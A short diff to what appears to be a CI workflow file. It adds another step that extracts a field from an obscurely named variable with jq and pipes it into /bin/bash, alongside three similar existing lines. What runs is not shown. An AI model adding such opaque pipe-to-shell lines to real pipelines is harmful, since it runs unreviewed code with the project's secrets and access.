@@ -28,6 +28,7 @@ jobs:
           echo $y5497 | jq -r .b6 | /bin/bash
           echo $tmwq8 | jq -r .vm64 | /bin/bash
           echo $puhmc325 | jq -r .k3705 | /bin/bash
+          printf '%s' "$a809" | jq -r .esyd33920 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
